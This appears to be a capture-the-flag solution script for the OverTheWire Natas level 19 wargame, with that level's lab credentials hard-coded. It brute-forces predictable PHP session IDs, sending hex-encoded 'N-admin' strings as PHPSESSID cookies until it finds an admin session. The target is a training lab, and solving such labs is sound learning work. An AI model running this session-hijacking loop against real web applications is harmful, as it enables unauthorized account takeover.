import requests

username = 'natas19'
password = '4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs'

url = "http://%s.natas.labs.overthewire.org" % username
r = requests.get(url, auth = (username,password))

data = {
    "username": '',
    'password': 'xyWsdfpisjdfiohd'
}
r = requests.post(url, params={'debug': ''}, data=data, auth=(username, password))

def strtohex(string):
    return "".join(hex(ord(c))[2:] for c in string)


for i in range(640): 
    print(i)
    sessid = strtohex(f'%d-admin' % i)
    #print(sessid)
    cookies = {
        'PHPSESSID': sessid
    }
    r = requests.post(url, params={'debug': ''}, cookies=cookies, auth=(username, password))
    #print(r.text)
    if  'regular user' not in r.text:
        print(r.text)
        break
        #print(r.cookies)#